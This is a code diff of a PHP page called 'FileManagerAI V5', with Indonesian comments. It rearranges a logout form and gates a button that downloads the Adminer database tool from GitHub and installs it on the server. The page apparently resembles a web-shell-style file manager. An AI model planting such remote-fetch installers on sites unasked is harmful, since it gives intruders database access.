@@ -395,6 +395,20 @@ input[type="submit"]:hover {
 <body>
    <center> <h2>FileManagerAI V5</h2> </center>
 
+
+  <table>
+        <tbody>
+            <tr>
+<td>
+    <!-- Tombol Logout -->
+	<form action="" method="post">
+		<input type="submit" name="logout" value="Logout">
+    	</form>
+</td>
+
+
+<td>
+
 <?php
 // URL file yang akan diunduh
 $url = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
@@ -427,8 +441,8 @@ function downloadFile($url, $targetFile) {
     return true;
 }
 
-// Cek jika form di-submit
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+// Cek jika form di-submit dan tombol yang benar ditekan
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['download_adminer'])) {
     if (downloadFile($url, $targetFile)) {
         echo "File adminer.php telah berhasil dipasang.";
     } else {
@@ -436,21 +450,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 ?>
-  <table>
-        <tbody>
-            <tr>
-<td>
-    <!-- Tombol Logout -->
-	<form action="" method="post">
-		<input type="submit" name="logout" value="Logout">
-    	</form>
-</td>
 
+<form action="" method="post">
+    <input type="submit" name="download_adminer" value="adminer">
+</form>
 
-<td>
-	<form action="" method="post">
-		<input type="submit" value="adminer">
-	</form>
 </td>
 
 
